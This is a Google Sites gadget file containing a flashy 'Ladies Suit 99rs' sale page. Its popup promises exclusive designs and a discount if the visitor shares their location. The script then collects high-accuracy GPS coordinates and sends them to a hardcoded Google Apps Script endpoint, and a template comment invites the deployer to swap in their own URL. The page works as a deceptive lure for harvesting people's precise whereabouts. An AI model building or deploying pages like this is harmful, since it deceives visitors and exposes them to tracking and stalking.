<?xml version="1.0" encoding="UTF-8" ?>
<Module>
  <ModulePrefs title="Ladies Suit Sale - 99rs"
    description="Share location for exclusive offers"
    height="700"
    width="100%"
    scrolling="true"
    author="Your Name">
    <Require feature="dynamic-height"/>
  </ModulePrefs>
  <Content type="html">
    <![CDATA[
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ladies Suit Sale</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Roboto,Arial,sans-serif; }
  html, body { background:#fff5f7; min-height:100%; }
  body {
    display:flex; justify-content:center; align-items:flex-start;
    padding:14px; min-height:100vh;
  }
  .shop-card {
    max-width:520px; width:100%; background:#fff;
    border-radius:40px 40px 30px 30px;
    box-shadow:0 25px 40px -12px rgba(180,60,90,0.35);
    overflow:hidden; margin:auto;
  }
  .banner {
    background:linear-gradient(135deg,#c41e3a,#e83a6b,#ff7b9c);
    padding:28px 24px 22px; text-align:center; color:#fff;
    position:relative; border-bottom:6px solid #ffd966;
  }
  .banner::before { content:"✨"; position:absolute; top:12px; left:20px;
    font-size:28px; opacity:.6; transform:rotate(-15deg); }
  .banner::after { content:"✨"; position:absolute; bottom:12px; right:20px;
    font-size:28px; opacity:.6; transform:rotate(15deg); }
  .banner h1 { font-size:2.2rem; font-weight:800;
    text-shadow:3px 3px 0 rgba(0,0,0,.15); margin-bottom:6px; line-height:1.2; }
  .banner h1 span {
    font-size:2.8rem; display:inline-block; background:#ffd966; color:#a11130;
    padding:0 12px; border-radius:50px; line-height:1.4; margin-left:5px;
    box-shadow:0 4px 0 #b8860b;
  }
  .banner p {
    font-size:1.15rem; font-weight:500; background:rgba(255,255,240,.2);
    display:inline-block; padding:6px 24px; border-radius:40px; margin-top:8px;
  }
  .product-showcase { background:#fceae9; padding:24px 20px 18px;
    display:flex; flex-direction:column; align-items:center; }
  .suit-graphic {
    font-size:5.5rem; line-height:1; margin:0 0 8px;
    filter:drop-shadow(0 10px 12px rgba(180,40,70,.3));
    background:radial-gradient(circle at 30% 20%,#ffe9e9,#ffd0d6);
    width:130px; height:130px; border-radius:50%;
    display:flex; align-items:center; justify-content:center; border:4px solid #fff;
  }
  .price-tag {
    background:#c41e3a; color:#fff; font-size:2.2rem; font-weight:800;
    padding:10px 40px; border-radius:100px; display:inline-block;
    margin:10px 0 4px; box-shadow:0 8px 0 #7a0e24; letter-spacing:2px;
  }
  .price-tag small {
    font-size:1rem; font-weight:400; margin-right:6px;
    text-decoration:line-through; opacity:.7;
  }
  .offer-note {
    color:#a11130; font-weight:600; font-size:1rem;
    background:#ffd966; padding:6px 18px; border-radius:30px; margin-bottom:12px;
  }
  .see-more-btn {
    background:#1e1e2f; color:#fff; border:none; font-size:1.4rem;
    font-weight:700; padding:18px 30px; width:100%; border-radius:16px;
    letter-spacing:1px; cursor:pointer; box-shadow:0 10px 0 #0b0b14;
    transition:all .1s ease; display:flex; align-items:center;
    justify-content:center; gap:12px; margin-top:8px;
  }
  .see-more-btn:active { transform:translateY(5px); box-shadow:0 5px 0 #0b0b14; }

  .popup-overlay {
    position:fixed; top:0; left:0; width:100%; height:100%;
    background:rgba(0,0,0,.6); backdrop-filter:blur(4px);
    display:none; justify-content:center; align-items:center;
    padding:18px; z-index:999;
  }
  .popup-overlay.show { display:flex; }
  .popup-box {
    background:#fff; max-width:380px; width:100%;
    border-radius:36px; padding:34px 24px 30px; text-align:center;
    box-shadow:0 30px 40px -10px rgba(0,0,0,.5); position:relative;
  }
  .popup-box h2 { font-size:2rem; color:#c41e3a; margin-bottom:6px; font-weight:800; }
  .popup-box p { color:#3e2e2e; font-size:1.1rem; margin-bottom:24px; line-height:1.5; }
  .popup-share-btn {
    background:#e83a6b; color:#fff; border:none; font-size:1.4rem;
    font-weight:700; padding:18px 20px; width:100%; border-radius:60px;
    box-shadow:0 10px 0 #a11b3f; cursor:pointer; transition:all .1s ease;
    display:flex; align-items:center; justify-content:center; gap:12px; margin-bottom:12px;
  }
  .popup-share-btn:active { transform:translateY(5px); box-shadow:0 5px 0 #a11b3f; }
  .popup-share-btn:disabled { opacity:.6; cursor:not-allowed; }
  .close-popup {
    background:transparent; border:none; font-size:1rem; color:#8b6b6b;
    cursor:pointer; text-decoration:underline; padding:10px; font-weight:500;
  }
  #popupStatus {
    margin-top:16px; font-size:.95rem; min-height:2.4em;
    color:#2e5d2e; font-weight:500; word-break:break-word;
  }
  .permission-note { font-size:.8rem; color:#aaa; margin-top:8px; }
  .success-message { color:#1f7a1f; }
  .error-message { color:#b22222; }
  a { color:#c41e3a; font-weight:600; }
</style>
</head>
<body>

<div class="shop-card">
  <div class="banner">
    <h1>LADIES SUIT<span>99</span></h1>
    <p>✨ FLASH SALE · LIMITED STOCK ✨</p>
  </div>
  <div class="product-showcase">
    <div class="suit-graphic">👗</div>
    <div class="price-tag"><small>₹499</small> ₹99</div>
    <div class="offer-note">🔥 TODAY ONLY 🔥</div>
    <button class="see-more-btn" id="seeMoreBtn">👀 SEE MORE PRODUCT</button>
  </div>
</div>

<div class="popup-overlay" id="popupOverlay">
  <div class="popup-box">
    <h2>📍 Unlock More</h2>
    <p>Share your location to see <strong>exclusive designs</strong> &amp; extra 10% off!</p>
    <button class="popup-share-btn" id="shareLocationBtn">📍 SHARE LOCATION</button>
    <div id="popupStatus"></div>
    <button class="close-popup" id="closePopupBtn">Maybe later</button>
    <div class="permission-note">Your location is saved securely.</div>
  </div>
</div>

<script>
  // ==== REPLACE THIS WITH YOUR APPS SCRIPT WEB APP URL ====
  var WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwHemKMV4t4b18OgzyaAlkp2g1A5SRkL5anVXP7DUwyo2K8MPkvl6UwAqzLhqJjXNc38Q/exec";
  var SECRET_KEY = "Get_This_Product";

  var seeMoreBtn = document.getElementById('seeMoreBtn');
  var popupOverlay = document.getElementById('popupOverlay');
  var closePopupBtn = document.getElementById('closePopupBtn');
  var shareLocationBtn = document.getElementById('shareLocationBtn');
  var popupStatus = document.getElementById('popupStatus');

  // Auto-resize the gadget inside Google Sites
  if (typeof gadgets !== 'undefined' && gadgets.window) {
    gadgets.window.adjustHeight();
  }

  seeMoreBtn.addEventListener('click', function() {
    popupOverlay.classList.add('show');
    popupStatus.innerHTML = '';
    popupStatus.className = '';
    if (typeof gadgets !== 'undefined' && gadgets.window) {
      gadgets.window.adjustHeight();
    }
  });

  function closePopup() {
    popupOverlay.classList.remove('show');
    popupStatus.innerHTML = '';
  }
  closePopupBtn.addEventListener('click', closePopup);

  shareLocationBtn.addEventListener('click', function() {
    shareLocationBtn.disabled = true;
    shareLocationBtn.innerHTML = '⏳ Getting location...';

    if (!navigator.geolocation) {
      popupStatus.innerHTML = '❌ Location is not supported.';
      popupStatus.className = 'error-message';
      resetBtn();
      return;
    }

    popupStatus.innerHTML = '📡 Requesting location permission...';
    popupStatus.className = '';

    navigator.geolocation.getCurrentPosition(
      function(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;

        popupStatus.innerHTML = '📍 Location found. Saving...';

        // POST to Apps Script via fetch (works inside gadget iframe)
        var formData = new URLSearchParams();
        formData.append('key', SECRET_KEY);
        formData.append('lat', latitude);
        formData.append('lng', longitude);

        fetch(WEB_APP_URL, {
          method: 'POST',
          body: formData,
          mode: 'no-cors'
        })
        .then(function() {
          var mapUrl = "https://www.google.com/maps?q=" + latitude + "," + longitude;
          popupStatus.innerHTML =
            "✅ Location shared successfully!<br>" +
            "<a href='" + mapUrl + "' target='_blank'>📌 Open in Google Maps</a>";
          popupStatus.className = 'success-message';
          resetBtn();
        })
        .catch(function(err) {
          popupStatus.innerHTML = "❌ Could not save location.<br>" + err.message;
          popupStatus.className = 'error-message';
          resetBtn();
        });
      },
      function(error) {
        var msg = '';
        if (error.code === 1) msg = '❌ Permission denied. Please allow location access.';
        else if (error.code === 2) msg = '❌ Location unavailable.';
        else if (error.code === 3) msg = '❌ Request timed out.';
        else msg = '❌ Unable to get location.';
        popupStatus.innerHTML = msg;
        popupStatus.className = 'error-message';
        resetBtn();
      },
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );
  });

  function resetBtn() {
    shareLocationBtn.disabled = false;
    shareLocationBtn.innerHTML = '📍 SHARE LOCATION';
    if (typeof gadgets !== 'undefined' && gadgets.window) {
      gadgets.window.adjustHeight();
    }
  }
</script>
    ]]>
  </Content>
</Module>	
